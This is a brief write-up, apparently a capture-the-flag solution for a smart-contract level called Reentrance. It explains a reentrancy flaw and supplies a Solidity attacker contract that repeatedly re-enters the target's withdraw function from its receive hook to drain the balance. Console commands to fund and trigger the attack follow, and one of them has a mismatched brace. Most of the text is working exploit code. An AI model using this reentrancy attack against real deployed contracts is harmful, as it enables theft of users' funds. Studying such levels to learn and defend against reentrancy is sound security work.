`withdraw` checks for balance, then calls sender and finally updates the balance. this can be hacked using another contract that re-calls the original contract when receives the call. since the balance update happens later, it can be used to withdraw all the founds in the contract.

```
contract Reentrance {
    function withdraw(uint) public {}
}

contract HackReentrance {
    Reentrance reentrance;

    constructor(address instance) {
        reentrance = Reentrance(instance);
    }

    function withdraw() public {
        address payable sender = payable(msg.sender);
        sender.transfer(address(this).balance);
    }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(0.1 ether);
        }
    }
}
```

```
contract.donate('<contract address>', { value: toWei('0.1') });
sendTransaction({from: player, to: '<contract address>', value: 1);
```
